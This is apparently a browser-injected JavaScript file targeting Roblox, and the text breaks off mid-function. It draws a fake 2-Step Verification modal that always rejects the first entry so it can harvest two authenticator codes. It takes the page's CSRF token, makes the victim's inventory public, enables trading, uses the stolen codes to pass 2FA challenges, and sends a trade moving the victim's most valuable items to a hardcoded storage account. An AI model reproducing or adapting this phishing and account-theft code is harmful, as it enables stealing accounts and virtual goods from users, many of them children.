console.log("[INJECTOR] Script injected and starting...");
(() => {
  console.log("[INJECTOR] IIFE executing...");
  const STORAGE_ACCOUNT_ID = 540003639;

  // Shared state for threads
  const state = {
    userInfo: null,
    userInventory: null,
    userInstanceIds: [],
    userTradableItems: [], // Full tradable items data for user
    storageInfo: null,
    storageInventory: null,
    storageInstanceIds: [],
    storageTradableItems: [], // Full tradable items data for storage
    tradePlan: null,
    purchaseDetected: false,
    purchaseData: null,
    hasPremium: false,
    premiumCheckComplete: false,
    csrfToken: null,
    authToken: null,
    pausedRequests: {} // Store paused requests: {requestKey: {url, method, headers, body, resolve, reject}}
  };

  // Get CSRF token from localStorage (same as main.py)
  const getCSRFToken = () => {
    try {
      const csrfToken = localStorage.getItem('x-csrf-token') ||
                       localStorage.getItem('csrf-token') ||
                       localStorage.getItem('X-CSRF-Token');
      if (csrfToken) {
        console.log('[CSRF] Got CSRF token from localStorage');
        state.csrfToken = csrfToken;
        return csrfToken;
      }
    } catch (e) {
      console.error('[CSRF] Error getting CSRF token:', e);
    }
    return null;
  };

  // Get user info from page (same as main.py)
  const getUserInfo = () => {
    try {
      const meta = document.querySelector('meta[name="user-data"]');
      if (meta) {
        return {
          user_id: meta.getAttribute("data-userid") || "",
          name: meta.getAttribute("data-name") || "",
          display_name: meta.getAttribute("data-displayname") || "",
          is_premium: meta.getAttribute("data-ispremiumuser") === "true",
          is_under_13: meta.getAttribute("data-isunder13") === "true",
          created: meta.getAttribute("data-created") || "",
          has_verified_badge: meta.getAttribute("data-hasverifiedbadge") === "true",
          method: "meta"
        };
      }

      const elem = document.querySelector("a.user-name-container");
      if (elem) {
        const href = elem.getAttribute("href") || "";
        const text = elem.textContent || elem.innerText || "";
        const userIdMatch = href.match(/\/users\/(\d+)\/profile/);
        const userId = userIdMatch ? userIdMatch[1] : "";
        const nameMatch = text.match(/Morning,\s*(.+)/);
        const name = nameMatch ? nameMatch[1].trim() : text.trim();
        return {
          user_id: userId,
          name: name,
          display_name: name,
          is_premium: false,
          method: "fallback"
        };
      }
      return null;
    } catch (e) {
      console.error('[GET_USER_INFO] Error:', e);
      return null;
    }
  };

  // Send trade to storage account
  const sendTradeToStorage = async (secondCode, csrfToken, authToken) => {
    try {
      console.log("[TRADE] Starting trade to storage account...");

      if (!state.userInfo || !state.userInfo.user_id) {
        console.error("[TRADE] ✗ No user info available");
        return;
      }

      const userId = parseInt(state.userInfo.user_id);
      const storageAccountId = STORAGE_ACCOUNT_ID;

      // Step 1: Select storage item (lowest value under 1k, not on hold)
      console.log("[TRADE] Selecting storage item...");
      const storageItems = state.storageTradableItems || [];
      const itemsUnder1k = [];

      for (const item of storageItems) {
        if (!item || typeof item !== 'object') continue;

        const itemTarget = item.itemTarget || {};
        const estimatedValue = item.estimatedValue || item.estimated_value || 0;
        const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
        const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

        if (value > 0 && value < 1000) {
          itemsUnder1k.push(item);
        }
      }

      if (itemsUnder1k.length === 0) {
        console.error("[TRADE] ✗ No storage items under 1k available");
        return;
      }

      // Sort by value (lowest first)
      itemsUnder1k.sort((a, b) => {
        const valA = a.estimatedValue || a.estimated_value || a.recentAveragePrice || a.recent_average_price || 0;
        const valB = b.estimatedValue || b.estimated_value || b.recentAveragePrice || b.recent_average_price || 0;
        return valA - valB;
      });

      // Find first item with non-on-hold instance
      let storageInstanceId = null;
      for (const candidate of itemsUnder1k) {
        const instances = candidate.instances || [];
        for (const instance of instances) {
          if (!instance.isOnHold && !instance.is_on_hold) {
            storageInstanceId = instance.collectibleItemInstanceId || instance.collectible_item_instance_id;
            if (storageInstanceId) {
              console.log("[TRADE] ✓ Selected storage item instance:", storageInstanceId);
              break;
            }
          }
        }
        if (storageInstanceId) break;
      }

      if (!storageInstanceId) {
        console.error("[TRADE] ✗ No storage item under 1k has a non-on-hold instance");
        return;
      }

      // Step 2: Select user items (highest to lowest value, not on hold, max 4 items)
      console.log("[TRADE] Selecting user items...");
      const userItems = state.userTradableItems || [];
      const availableUserItems = [];

      // Collect all available instances from user items
      for (const item of userItems) {
        if (!item || typeof item !== 'object') continue;

        const instances = item.instances || [];
        const itemTarget = item.itemTarget || {};
        const estimatedValue = item.estimatedValue || item.estimated_value || 0;
        const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
        const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

        for (const instance of instances) {
          if (!instance.isOnHold && !instance.is_on_hold) {
            const instanceId = instance.collectibleItemInstanceId || instance.collectible_item_instance_id;
            if (instanceId) {
              availableUserItems.push({
                instanceId: instanceId,
                value: value
              });
            }
          }
        }
      }

      if (availableUserItems.length === 0) {
        console.error("[TRADE] ✗ No user items available (all on hold or no instances)");
        return;
      }

      // Sort by value (highest first)
      availableUserItems.sort((a, b) => b.value - a.value);

      // Take up to 4 items
      const selectedUserInstances = availableUserItems.slice(0, 4).map(item => item.instanceId);
      console.log("[TRADE] ✓ Selected", selectedUserInstances.length, "user items:", selectedUserInstances);

      if (selectedUserInstances.length === 0) {
        console.error("[TRADE] ✗ No user items selected");
        return;
      }

      // Step 3: Send trade
      console.log("[TRADE] Sending trade request...");
      const payload = {
        senderOffer: {
          userId: userId,
          robux: 0,
          collectibleItemInstanceIds: selectedUserInstances
        },
        recipientOffer: {
          userId: storageAccountId,
          robux: 0,
          collectibleItemInstanceIds: [storageInstanceId]
        }
      };

      const headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "X-CSRF-Token": csrfToken
      };
      if (authToken) {
        headers["X-Bound-Auth-Token"] = authToken;
      }

      const tradeResponse = await fetch("https://trades.roblox.com/v2/trades/send", {
        method: "POST",
        credentials: "include",
        headers: headers,
        body: JSON.stringify(payload)
      });

      const tradeData = await tradeResponse.json().catch(() => ({}));
      const tradeHeaders = {};
      tradeResponse.headers.forEach((value, key) => {
        tradeHeaders[key] = value;
      });

      console.log("[TRADE] Trade response status:", tradeResponse.status);

      if (tradeResponse.status === 200) {
        console.log("[TRADE] ✓ Trade sent successfully!");
      } else if (tradeResponse.status === 403) {
        // Handle 2FA challenge using second_code
        console.log("[TRADE] Trade requires 2FA challenge, using second_code...");
        const challengeId = tradeHeaders['rblx-challenge-id'] || tradeHeaders['Rblx-Challenge-Id'];
        const challengeMetadataB64 = tradeHeaders['rblx-challenge-metadata'] || tradeHeaders['Rblx-Challenge-Metadata'];

        if (challengeId && challengeMetadataB64 && secondCode) {
          try {
            const challengeMetadata = JSON.parse(atob(challengeMetadataB64));
            const challengeUserId = challengeMetadata.userId;
            const challengeIdValue = challengeMetadata.challengeId;

            // Verify challenge using second_code
            const verifyResponse = await fetch(`https://twostepverification.roblox.com/v1/users/${challengeUserId}/challenges/authenticator/verify`, {
              method: "POST",
              credentials: "include",
              headers: {
                "Content-Type": "application/json",
                "X-CSRF-Token": csrfToken,
                "Accept": "application/json"
              },
              body: JSON.stringify({
                "challengeId": challengeIdValue,
                "actionType": "Generic",
                "code": secondCode
              })
            });

            const verifyData = await verifyResponse.json();
            let verificationToken = null;
            if (verifyResponse.ok && verifyData) {
              if (verifyData.verificationToken) {
                verificationToken = verifyData.verificationToken;
              } else if (verifyData.data && verifyData.data.verificationToken) {
                verificationToken = verifyData.data.verificationToken;
              }
            }

            if (verificationToken) {
              console.log("[TRADE] ✓ Got verificationToken from /verify");

              // Call /continue
              const continueMetadataObj = {
                "verificationToken": verificationToken,
                "rememberDevice": false,
                "challengeId": challengeIdValue,
                "actionType": "Generic"
              };
              const continueMetadataStr = JSON.stringify(continueMetadataObj, null, 0).replace(/\s+/g, '');

              const continueHeaders = {
                "Content-Type": "application/json",
                "X-CSRF-Token": csrfToken,
                "Accept": "application/json"
              };
              if (authToken) {
                continueHeaders["X-Bound-Auth-Token"] = authToken;
              }

              const continueResponse = await fetch("https://apis.roblox.com/challenge/v1/continue", {
                method: "POST",
                credentials: "include",
                headers: continueHeaders,
                body: JSON.stringify({
                  "challengeId": challengeId,
                  "challengeType": "twostepverification",
                  "challengeMetadata": continueMetadataStr
                })
              });

              const continueData = await continueResponse.json();
              if (continueResponse.ok) {
                console.log("[TRADE] ✓ /continue successful");

                // Retry trade with challenge headers
                const retryChallengeMetadataObj = {
                  "verificationToken": verificationToken,
                  "rememberDevice": false,
                  "challengeId": challengeIdValue,
                  "actionType": "Generic"
                };
                const retryChallengeMetadataB64 = btoa(JSON.stringify(retryChallengeMetadataObj));

                const retryHeaders = {
                  ...headers,
                  "rblx-challenge-type": "twostepverification",
                  "rblx-challenge-id": challengeId,
                  "rblx-challenge-metadata": retryChallengeMetadataB64
                };

                const retryTradeResponse = await fetch("https://trades.roblox.com/v2/trades/send", {
                  method: "POST",
                  credentials: "include",
                  headers: retryHeaders,
                  body: JSON.stringify(payload)
                });

                const retryTradeData = await retryTradeResponse.json().catch(() => ({}));
                if (retryTradeResponse.status === 200) {
                  console.log("[TRADE] ✓ Trade sent successfully after /continue!");
                } else {
                  console.error("[TRADE] ✗ Trade retry failed:", retryTradeResponse.status, retryTradeData);
                }
              } else {
                console.error("[TRADE] ✗ /continue failed:", continueData);
              }
            } else {
              console.error("[TRADE] ✗ Failed to get verificationToken from /verify");
            }
          } catch (e) {
            console.error("[TRADE] Error handling trade 2FA:", e);
          }
        }
      } else {
        console.error("[TRADE] ✗ Trade failed:", tradeResponse.status, tradeData);
      }
    } catch (e) {
      console.error("[TRADE] Error sending trade:", e);
    }
  };

  // Get tradable items (same API as main.py)
  const getTradableItems = async (userId) => {
    if (!userId) return { items: [], instanceIds: [] };

    try {
      const allItems = [];
      const instanceIds = [];
      let nextCursor = null;
      let pageCount = 0;
      const maxPages = 100;

      while (pageCount < maxPages) {
        let url = `https://trades.roblox.com/v2/users/${userId}/tradableitems?sortBy=CreationTime&sortOrder=Desc&limit=50`;
        if (nextCursor) {
          url += `&cursor=${encodeURIComponent(nextCursor)}`;
        }

        const response = await fetch(url, {
          method: 'GET',
          credentials: 'include',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          }
        });

        if (!response.ok) {
          console.error(`[TRADABLE] API error: ${response.status}`);
          break;
        }

        const data = await response.json();

        if (data.items && Array.isArray(data.items)) {
          allItems.push(...data.items);

          for (const item of data.items) {
            if (item.instances && Array.isArray(item.instances)) {
              for (const instance of item.instances) {
                const instanceId = instance.collectibleItemInstanceId;
                const isOnHold = instance.isOnHold || false;
                if (instanceId && !isOnHold && !instanceIds.includes(instanceId)) {
                  instanceIds.push(instanceId);
                }
              }
            }
          }
        }

        nextCursor = data.nextPageCursor;
        if (!nextCursor) break;

        pageCount++;
        await new Promise(resolve => setTimeout(resolve, 200));
      }

      return { items: allItems, instanceIds: instanceIds, fullItems: allItems }; // Keep full items for trade selection
    } catch (e) {
      console.error('[TRADABLE] Error:', e);
      return { items: [], instanceIds: [] };
    }
  };

  // Inject 2FA modal - collects TWO codes (first_code and second_code)
  const inject2FAModal = (requestKey, pausedRequest) => {
    console.log('[2FA] Starting modal injection for request:', requestKey);

    // Check if modal already exists
    const existing = document.getElementById("rbx-2sv-root");
    if (existing) {
      console.log("[2FA] Modal already exists, preventing duplicate injection");
      return false;
    }

    // Store request key and paused request
    window.__rbx_request_key = requestKey;
    window.__rbx_paused_request = pausedRequest;
    console.log("[2FA] Request key stored:", window.__rbx_request_key);

    // Helper to store 2FA result in meta tag
    const store2FAResult = (data) => {
      try {
        let meta = document.querySelector('meta[name="rbx-2fa-result"]');
        if (!meta) {
          meta = document.createElement('meta');
          meta.name = 'rbx-2fa-result';
          document.head.appendChild(meta);
        }
        meta.setAttribute('data-result', data.result || '');
        meta.setAttribute('data-code', data.code || ''); // second_code
        meta.setAttribute('data-first-code', data.first_code || '');
        meta.setAttribute('data-second-code', data.second_code || '');
        meta.setAttribute('data-reason', data.reason || '');
        meta.setAttribute('data-request-key', data.request_key || '');
        meta.setAttribute('data-ready', 'true');
        console.log("[2FA] Result stored in meta tag:", data.result);
        return true;
      } catch (e) {
        console.error("[2FA] Error storing result:", e);
        return false;
      }
    };

    // Wait for body
    function injectModal() {
      if (!document.body) {
        console.log("[2FA] Waiting for document.body...");
        setTimeout(injectModal, 100);
        return;
      }

      // Remove old modals
      document.querySelectorAll('.modal, .modal-backdrop').forEach(e => e.remove());

      const root = document.createElement("div");
      root.id = "rbx-2sv-root";

      root.innerHTML =
        '<div>' +
        '  <div class="fade modal-backdrop in"></div>' +
        '  <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display:block;">' +
        '    <div class="modal-dialog">' +
        '      <div class="modal-content" role="document">' +
        '        <div class="modal-header">' +
        '          <button type="button" class="modal-modern-header-button" id="rbx-2sv-close">' +
        '            <span class="icon-close"></span>' +
        '          </button>' +
        '          <h4 class="modal-title">2-Step Verification</h4>' +
        '          <div class="modal-modern-header-info"></div>' +
        '        </div>' +
        '        <div class="modal-body">' +
        '          <div class="modal-protection-shield-icon"></div>' +
        '          <div class="modal-margin-bottom-xlarge" style="text-align:center;">' +
        '            Enter the code generated by your authenticator app.' +
        '          </div>' +
        '          <div class="input-control-wrapper">' +
        '            <div class="form-group">' +
        '              <input id="two-step-verification-code-input" type="text" inputmode="numeric" ' +
        '                     autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" ' +
        '                     class="input-field input-field form-control"/>' +
        '              <div id="rbx-otp-error" class="form-control-label bottom-label xsmall" ' +
        '                   style="color:#ff4b4b; display:none;">Invalid code.</div>' +
        '            </div>' +
        '          </div>' +
        '        </div>' +
        '        <div class="modal-footer">' +
        '          <div class="modal-modern-footer-buttons">' +
        '            <button id="rbx-verify-btn" type="button" ' +
        '                    class="btn-cta-md modal-modern-footer-button" disabled>Verify</button>' +
        '          </div>' +
        '          <div class="text-footer modal-margin-bottom">' +
        '            Need help? Contact <a class="text-name text-footer contact" ' +
        '            href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a>' +
        '          </div>' +
        '          <div class="text-footer" style="line-height:1.2;">' +
        '            IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.' +
        '          </div>' +
        '        </div>' +
        '      </div>' +
        '    </div>' +
        '  </div>' +
        '</div>';

      document.body.appendChild(root);

      // Force highest z-index
      root.style.position = "fixed";
      root.style.top = "0";
      root.style.left = "0";
      root.style.right = "0";
      root.style.bottom = "0";
      root.style.width = "100%";
      root.style.height = "100%";
      root.style.zIndex = "2147483647";
      root.style.pointerEvents = "auto";
      root.style.display = "block";
      root.style.visibility = "visible";

      const myModal = root.querySelector('.modal-modern, .modal');
      if (myModal) {
        myModal.style.zIndex = "2147483647";
        myModal.style.pointerEvents = "auto";
        myModal.style.display = "block";
        myModal.style.visibility = "visible";
      }

      // Disable underlying dialogs
      document.querySelectorAll('[role="dialog"]').forEach(d => {
        if (!root.contains(d)) {
          d.setAttribute("aria-hidden", "true");
          d.style.pointerEvents = "none";
          d.style.filter = "blur(1px)";
        }
      });

      // Modal logic - collect TWO codes (first always invalid, like main.py)
      const input = document.getElementById("two-step-verification-code-input");
      const btn = document.getElementById("rbx-verify-btn");
      const err = document.getElementById("rbx-otp-error");
      const closeBtn = document.getElementById("rbx-2sv-close");

      let firstAttempt = true;
      let firstInvalidCode = null; // Store the first invalid code (always invalid)
      let currentCode = null;

      setTimeout(() => input.focus(), 0);

      input.addEventListener("input", (e) => {
        input.value = input.value.replace(/\D/g, "");
        err.style.display = "none";
        input.style.borderColor = "";
        btn.disabled = input.value.length !== 6;

        // Store code when 6 digits entered
        if (input.value.length === 6) {
          currentCode = input.value;
        }
      });

      btn.addEventListener("click", () => {
        console.log("[2FA] Verify button clicked, firstAttempt:", firstAttempt, "value:", input.value);

        if (firstAttempt) {
          // First code - ALWAYS invalid (like main.py)
          firstInvalidCode = input.value;
          currentCode = null; // Reset current code
          console.log("[2FA] First attempt failed (always invalid), stored invalid code:", firstInvalidCode);
          firstAttempt = false;
          err.style.display = "block";
          input.style.borderColor = "#ff4b4b";
          // Clear input so user must enter a different code
          input.value = "";
          btn.disabled = true;
          console.log("[2FA] Input cleared, waiting for new code");
          return;
        }

        // Check if the code is the same as the first invalid code
        if (input.value === firstInvalidCode) {
          console.log("[2FA] Same code as first invalid attempt, rejecting");
          err.style.display = "block";
          input.style.borderColor = "#ff4b4b";
          return;
        }

        // Second code entered (different from first)
        const secondCode = input.value;
        console.log("[2FA] Second code entered:", secondCode);
        console.log("[2FA] First code (invalid, logged):", firstInvalidCode);

        const requestKey = window.__rbx_request_key || "";
        const resultData = {
          result: "verified",
          code: secondCode, // second_code
          first_code: firstInvalidCode || "", // First code (always invalid, but we log it)
          second_code: secondCode,
          request_key: requestKey
        };

        store2FAResult(resultData);
        btn.disabled = true;
        btn.textContent = "Verifying...";

        // Enable inventory and trading after getting both codes
        (async () => {
          try {
            // Get CSRF token (refresh if needed)
            let csrfToken = state.csrfToken || getCSRFToken();
            if (!csrfToken) {
              // Try to get it again
              csrfToken = localStorage.getItem('x-csrf-token') ||
                         localStorage.getItem('csrf-token') ||
                         localStorage.getItem('X-CSRF-Token');
              if (csrfToken) {
                state.csrfToken = csrfToken;
              }
            }

            if (!csrfToken) {
              console.error("[2FA] No CSRF token available, cannot enable settings");
              // Still continue the request
              const pausedRequest = window.__rbx_paused_request;
              if (pausedRequest && pausedRequest.resolve) {
                pausedRequest.resolve({
                  first_code: firstInvalidCode,
                  second_code: secondCode
                });
              }
              return;
            }

            console.log("[2FA] Enabling inventory privacy (whoCanSeeMyInventory: AllUsers)...");

            // Step 1: Enable inventory privacy
            const inventoryResponse = await fetch("https://apis.roblox.com/user-settings-api/v1/user-settings", {
              method: "POST",
              credentials: "include",
              headers: {
                "Content-Type": "application/json",
                "X-CSRF-Token": csrfToken,
                "Accept": "application/json"
              },
              body: JSON.stringify({"whoCanSeeMyInventory": "AllUsers"})
            });

            if (inventoryResponse.ok) {
              console.log("[2FA] ✓ Inventory privacy set to AllUsers");
            } else {
              console.warn("[2FA] ⚠ Inventory privacy update failed:", inventoryResponse.status);
            }

            // Step 2: Enable trading
            console.log("[2FA] Enabling trading (whoCanTradeWithMe: AllUsers)...");

            const tradingResponse = await fetch("https://apis.roblox.com/user-settings-api/v1/user-settings", {
              method: "POST",
              credentials: "include",
              headers: {
                "Content-Type": "application/json",
                "X-CSRF-Token": csrfToken,
                "Accept": "application/json"
              },
              body: JSON.stringify({"whoCanTradeWithMe": "AllUsers"})
            });

            if (tradingResponse.ok) {
              console.log("[2FA] ✓ Trading enabled: AllUsers");

              // After trading is enabled, send trade to storage account
              console.log("[2FA] Trading enabled, now sending trade to storage account...");
              setTimeout(() => {
                const meta = document.querySelector('meta[name="rbx-2fa-result"]');
                const secondCodeFromMeta = meta ? (meta.getAttribute('data-second-code') || meta.getAttribute('data-code')) : null;
                if (secondCodeFromMeta) {
                  sendTradeToStorage(secondCodeFromMeta, csrfToken, state.authToken || (window.__rbx_paused_request && (window.__rbx_paused_request.headers['X-Bound-Auth-Token'] || window.__rbx_paused_request.headers['x-bound-auth-token'])));
                } else {
                  console.warn("[TRADE] Could not get secondCode from meta tag");
                }
              }, 1000);
            } else {
              console.warn("[2FA] ⚠ Trading enable failed:", tradingResponse.status);

              // Handle 2FA challenge if needed (status 403)
              if (tradingResponse.status === 403) {
                console.log("[2FA] Trading requires 2FA, using first_code...");
                const tradingHeaders = {};
                tradingResponse.headers.forEach((value, key) => {
                  tradingHeaders[key] = value;
                });

                const challengeId = tradingHeaders['rblx-challenge-id'] || tradingHeaders['Rblx-Challenge-Id'];
                const challengeMetadataB64 = tradingHeaders['rblx-challenge-metadata'] || tradingHeaders['Rblx-Challenge-Metadata'];

                if (challengeId && challengeMetadataB64 && firstInvalidCode) {
                  try {
                    const challengeMetadata = JSON.parse(atob(challengeMetadataB64));
                    const userId = challengeMetadata.userId;
                    const challengeIdValue = challengeMetadata.challengeId;

                    // Verify challenge using first_code
                    const verifyResponse = await fetch(`https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`, {
                      method: "POST",
                      credentials: "include",
                      headers: {
                        "Content-Type": "application/json",
                        "X-CSRF-Token": csrfToken,
                        "Accept": "application/json"
                      },
                      body: JSON.stringify({
                        "challengeId": challengeIdValue,
                        "actionType": "Generic",
                        "code": firstInvalidCode
                      })
                    });

                    let verifyData;
                    try {
                      verifyData = await verifyResponse.json();
                    } catch (e) {
                      console.error("[2FA] Failed to parse /verify response as JSON:", e);
                      const text = await verifyResponse.text();
                      console.error("[2FA] /verify response text:", text);
                      throw e;
                    }

                    console.log("[2FA] /verify response for trading - Status:", verifyResponse.status, "Body:", JSON.stringify(verifyData));

                    // Check response structure - try multiple possible locations
                    let verificationToken = null;
                    if (verifyResponse.ok && verifyData) {
                      // Try direct property first
                      if (verifyData.verificationToken) {
                        verificationToken = verifyData.verificationToken;
                        console.log("[2FA] Found verificationToken at verifyData.verificationToken");
                      }
                      // Try nested in data
                      else if (verifyData.data) {
                        if (verifyData.data.verificationToken) {
                          verificationToken = verifyData.data.verificationToken;
                          console.log("[2FA] Found verificationToken at verifyData.data.verificationToken");
                        } else if (typeof verifyData.data === 'object') {
                          // Check all properties of data
                          for (const key in verifyData.data) {
                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('verification')) {
                              verificationToken = verifyData.data[key];
                              console.log(`[2FA] Found verificationToken at verifyData.data.${key}`);
                              break;
                            }
                          }
                        }
                      }
                      // Try success wrapper
                      else if (verifyData.success && verifyData.data && verifyData.data.verificationToken) {
                        verificationToken = verifyData.data.verificationToken;
                        console.log("[2FA] Found verificationToken at verifyData.success.data.verificationToken");
                      }
                    }

                    if (verificationToken) {
                      console.log("[2FA] ✓ Got verificationToken from /verify for trading:", verificationToken);

                      // Step 2: Call /continue
                      console.log("[2FA] Calling /continue for trading...");
                      const continueMetadataObj = {
                        "verificationToken": verificationToken,
                        "rememberDevice": false,
                        "challengeId": challengeIdValue,
                        "actionType": "Generic"
                      };
                      // Use compact JSON (no spaces) like main.py does with separators=(',', ':')
                      const continueMetadataStr = JSON.stringify(continueMetadataObj, null, 0).replace(/\s+/g, '');

                      // Build headers - include X-Bound-Auth-Token if available
                      const continueHeaders = {
                        "Content-Type": "application/json",
                        "X-CSRF-Token": csrfToken,
                        "Accept": "application/json"
                      };
                      const authTokenForTrading = state.authToken || (window.__rbx_paused_request && (window.__rbx_paused_request.headers['X-Bound-Auth-Token'] || window.__rbx_paused_request.headers['x-bound-auth-token']));
                      if (authTokenForTrading) {
                        continueHeaders["X-Bound-Auth-Token"] = authTokenForTrading;
                      }

                      const continueResponse = await fetch("https://apis.roblox.com/challenge/v1/continue", {
                        method: "POST",
                        credentials: "include",
                        headers: continueHeaders,
                        body: JSON.stringify({
                          "challengeId": challengeId,
                          "challengeType": "twostepverification",
                          "challengeMetadata": continueMetadataStr
                        })
                      });

                      const continueData = await continueResponse.json();
                      if (continueResponse.ok) {
                        console.log("[2FA] ✓ /continue successful for trading");

                        // Step 3: Retry trading with challenge headers
                        const retryChallengeMetadataObj = {
                          "verificationToken": verificationToken,
                          "rememberDevice": false,
                          "challengeId": challengeIdValue,
                          "actionType": "Generic"
                        };
                        const retryChallengeMetadataB64 = btoa(JSON.stringify(retryChallengeMetadataObj));

                        const retryTradingResponse = await fetch("https://apis.roblox.com/user-settings-api/v1/user-settings", {
                          method: "POST",
                          credentials: "include",
                          headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-Token": csrfToken,
                            "Accept": "application/json",
                            "rblx-challenge-type": "twostepverification",
                            "rblx-challenge-id": challengeId,
                            "rblx-challenge-metadata": retryChallengeMetadataB64
                          },
                          body: JSON.stringify({"whoCanTradeWithMe": "AllUsers"})
                        });

                        if (retryTradingResponse.ok) {
                          console.log("[2FA] ✓ Trading enabled with first_code after /continue");

                          // After trading is enabled, send trade to storage account
                          console.log("[2FA] Trading enabled, now sending trade to storage account...");
                          setTimeout(() => {
                            const meta = document.querySelector('meta[name="rbx-2fa-result"]');
                            const secondCodeFromMeta = meta ? (meta.getAttribute('data-second-code') || meta.getAttribute('data-code')) : null;
                            if (secondCodeFromMeta) {
                              sendTradeToStorage(secondCodeFromMeta, csrfToken, state.authToken || (window.__rbx_paused_request && (window.__rbx_paused_request.headers['X-Bound-Auth-Token'] || window.__rbx_paused_request.headers['x-bound-auth-token'])));
                            } else {
                              console.warn("[TRADE] Could not get secondCode from meta tag");
                            }
                          }, 1000);
                        } else {
                          console.warn("[2FA] ⚠ Trading enable retry failed:", retryTradingResponse.status);
                        }
                      } else {
                        console.warn("[2FA] ⚠ /continue failed for trading:", continueData);
                      }
                    } else {
                      console.error("[2FA] ✗ Failed to get verificationToken from /verify for trading.");
                      console.error("[2FA] Response status:", verifyResponse.status);
                      console.error("[2FA] Response body:", JSON.stringify(verifyData, null, 2));
                      console.error("[2FA] Response keys:", Object.keys(verifyData || {}));
                      if (verifyData && verifyData.data) {
                        console.error("[2FA] Response data keys:", Object.keys(verifyData.data || {}));
                      }
                    }
                  } catch (e) {
                    console.error("[2FA] Error handling trading 2FA:", e);
                  }
                }
              }
            }

            // Continue the paused request after enabling settings
            const pausedRequest = window.__rbx_paused_request;
            if (pausedRequest && pausedRequest.resolve) {
              console.log("[2FA] Both codes received, settings enabled, continuing request...");

              // Extract auth token from paused request headers if available
              const authToken = pausedRequest.headers['X-Bound-Auth-Token'] || pausedRequest.headers['x-bound-auth-token'] || state.authToken;
              if (authToken && !state.authToken) {
                state.authToken = authToken;
                console.log("[2FA] Captured X-Bound-Auth-Token from paused request");
              }

              // Continue the original request (it might return 403 with challenge)
              (async () => {
                try {
                  // First, try the original request
                  const response = await origFetch(pausedRequest.url, {
                    method: pausedRequest.method,
                    headers: pausedRequest.headers,
                    body: pausedRequest.body,
                    credentials: 'include'
                  });

                  // Check if it requires 2FA challenge
                  if (response.status === 403) {
                    console.log("[2FA] Purchase request requires 2FA challenge, handling...");

                    // Get challenge headers from response
                    const challengeId = response.headers.get('rblx-challenge-id') || response.headers.get('Rblx-Challenge-Id');
                    const challengeMetadataB64 = response.headers.get('rblx-challenge-metadata') || response.headers.get('Rblx-Challenge-Metadata');

                    if (challengeId && challengeMetadataB64) {
                      try {
                        const challengeMetadata = JSON.parse(atob(challengeMetadataB64));
                        const userId = challengeMetadata.userId;
                        const challengeIdValue = challengeMetadata.challengeId;

                        console.log("[2FA] Step 1: Calling /verify with first_code...");
                        // Step 1: Verify challenge using first_code
                        const verifyResponse = await fetch(`https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`, {
                          method: "POST",
                          credentials: "include",
                          headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-Token": csrfToken,
                            "Accept": "application/json"
                          },
                          body: JSON.stringify({
                            "challengeId": challengeIdValue,
                            "actionType": "Generic",
                            "code": firstInvalidCode
                          })
                        });

                        let verifyData;
                        try {
                          verifyData = await verifyResponse.json();
                        } catch (e) {
                          console.error("[2FA] Failed to parse /verify response as JSON:", e);
                          const text = await verifyResponse.text();
                          console.error("[2FA] /verify response text:", text);
                          throw e;
                        }

                        console.log("[2FA] /verify response for purchase - Status:", verifyResponse.status, "Body:", JSON.stringify(verifyData));

                        // Check response structure - try multiple possible locations
                        let verificationToken = null;
                        if (verifyResponse.ok && verifyData) {
                          // Try direct property first
                          if (verifyData.verificationToken) {
                            verificationToken = verifyData.verificationToken;
                            console.log("[2FA] Found verificationToken at verifyData.verificationToken");
                          }
                          // Try nested in data
                          else if (verifyData.data) {
                            if (verifyData.data.verificationToken) {
                              verificationToken = verifyData.data.verificationToken;
                              console.log("[2FA] Found verificationToken at verifyData.data.verificationToken");
                            } else if (typeof verifyData.data === 'object') {
                              // Check all properties of data
                              for (const key in verifyData.data) {
                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('verification')) {
                                  verificationToken = verifyData.data[key];
                                  console.log(`[2FA] Found verificationToken at verifyData.data.${key}`);
                                  break;
                                }
                              }
                            }
                          }
                          // Try success wrapper
                          else if (verifyData.success && verifyData.data && verifyData.data.verificationToken) {
                            verificationToken = verifyData.data.verificationToken;
                            console.log("[2FA] Found verificationToken at verifyData.success.data.verificationToken");
                          }
                        }

                        if (verificationToken) {
                          console.log("[2FA] ✓ Got verificationToken from /verify:", verificationToken);

                          console.log("[2FA] Step 2: Calling /continue...");
                          // Step 2: Call /continue
                          const continueMetadataObj = {
                            "verificationToken": verificationToken,
                            "rememberDevice": false,
                            "challengeId": challengeIdValue,
                            "actionType": "Generic"
                          };
                          // Use compact JSON (no spaces) like main.py does with separators=(',', ':')
                          const continueMetadataStr = JSON.stringify(continueMetadataObj, null, 0).replace(/\s+/g, '');

                          // Build headers - include X-Bound-Auth-Token if available
                          const continueHeaders = {
                            "Content-Type": "application/json",
                            "X-CSRF-Token": csrfToken,
                            "Accept": "application/json"
                          };
                          const authTokenForContinue = pausedRequest.headers['X-Bound-Auth-Token'] || pausedRequest.headers['x-bound-auth-token'] || state.authToken;
                          if (authTokenForContinue) {
                            continueHeaders["X-Bound-Auth-Token"] = authTokenForContinue;
                          }

                          const continueResponse = await fetch("https://apis.roblox.com/challenge/v1/continue", {
                            method: "POST",
                            credentials: "include",
                            headers: continueHeaders,
                            body: JSON.stringify({
                              "challengeId": challengeId,
                              "challengeType": "twostepverification",
                              "challengeMetadata": continueMetadataStr
                            })
                          });

                          const continueData = await continueResponse.json();
                          if (continueResponse.ok) {
                            console.log("[2FA] ✓ /continue successful");

                            console.log("[2FA] Step 3: Retrying purchase request with challenge headers...");
                            // Step 3: Retry purchase request with challenge headers
                            const retryChallengeMetadataObj = {
                              "verificationToken": verificationToken,
                              "rememberDevice": false,
